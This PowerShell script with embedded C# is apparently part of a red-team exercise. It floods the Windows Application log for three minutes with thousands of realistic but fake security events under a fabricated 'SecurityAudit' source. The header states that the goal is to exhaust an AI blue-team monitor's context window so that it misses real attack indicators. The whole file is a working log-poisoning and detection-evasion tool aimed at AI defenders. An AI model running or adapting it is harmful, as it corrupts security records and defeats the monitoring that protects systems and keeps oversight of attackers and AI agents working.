<#
.SYNOPSIS
    MEME-017: Context Window Overflow — floods Windows event logs with thousands of
    plausible-but-fake security events to overwhelm the AI blue team's analysis capacity
.NOTES
    Session: SYSTEM OK — event log writes work from any session context
    No kill switch needed — fire-and-forget, events persist until log is cleared
    Anti-AI strategy: exploits context window limits and token budget by forcing
    the AI to read, parse, and analyze thousands of decoy events before finding real ones
    Time-limited: generates events for 3 minutes then exits
#>

# Generate fake security events that look real enough to investigate
# Each event type mimics a real attack indicator the AI blue team would want to analyze

$code = @"
using System;
using System.Diagnostics;
using System.Security;

namespace ContextBurn {
    public class LogFlood {
        public static string Flood() {
            Random rng = new Random();
            int count = 0;
            string[] fakeUsers = {
                "svc_backup", "admin.temp", "helpdesk01", "IUSR_WEBSVR",
                "sqlservice", "svc_monitor", "deploy.agent", "svc_antivirus",
                "print.spool", "svc_update", "netscanner", "svc_wsus",
                "backup.exec", "svc_sccm", "domain.join", "svc_dns"
            };
            string[] fakeIPs = {
                "10.0.1.50", "10.0.1.51", "10.0.2.100", "10.0.2.101",
                "10.0.3.25", "10.0.3.26", "172.16.0.10", "172.16.0.11",
                "192.168.1.200", "192.168.1.201", "10.0.5.5", "10.0.5.6"
            };
            string[] messages = {
                "Logon attempt by {0} from {1} - Type 3 network logon",
                "Failed logon for {0} from {1} - bad password (1 of 3)",
                "Credential validation for {0} requested from {1}",
                "Special privileges assigned to {0} after logon from {1}",
                "New process created by {0}: powershell.exe -NoP -W Hidden",
                "Scheduled task 'SystemHealthMonitor' modified by {0}",
                "Service 'Windows Management Instrumentation' restarted by {0}",
                "Registry key HKLM\\SOFTWARE\\Policies modified by {0}",
                "Firewall rule 'Core Networking' modified by {0} from {1}",
                "Windows Defender exclusion added by {0}: C:\\ProgramData\\",
                "Account {0} added to local Administrators group from {1}",
                "WinRM session established by {0} from {1}",
                "PowerShell script block logged for {0}: Invoke-WebRequest",
                "LDAP query from {1} by {0}: (objectClass=computer)",
                "SMB share access by {0} from {1}: \\\\DC01\\SYSVOL",
                "Kerberos TGS requested by {0} for SPN: MSSQLSvc/DB01",
                "NTLM authentication by {0} from {1} to FILESVR01",
                "WMI query from {0}: SELECT * FROM Win32_Process",
                "Audit policy change by {0}: enable process creation",
                "Security log cleared by {0} from {1}"
            };

            DateTime end = DateTime.Now.AddMinutes(3);
            string source = "Application";

            try {
                if (!EventLog.SourceExists("SecurityAudit")) {
                    EventLog.CreateEventSource("SecurityAudit", source);
                }
            } catch { }

            while (DateTime.Now < end) {
                try {
                    string user = fakeUsers[rng.Next(fakeUsers.Length)];
                    string ip = fakeIPs[rng.Next(fakeIPs.Length)];
                    string template = messages[rng.Next(messages.Length)];
                    string msg = String.Format(template, user, ip);

                    EventLogEntryType severity = (rng.Next(10) < 3) ?
                        EventLogEntryType.Warning : EventLogEntryType.Information;

                    EventLog.WriteEntry("SecurityAudit", msg, severity,
                        1000 + rng.Next(100));
                    count++;
                } catch { }

                // Randomized interval: 50-200ms between events for realistic spacing
                System.Threading.Thread.Sleep(50 + rng.Next(150));
            }

            return String.Format("Wrote {0} decoy security events to Application log.", count);
        }
    }
}
"@

Add-Type -TypeDefinition $code -ErrorAction Stop
[ContextBurn.LogFlood]::Flood()
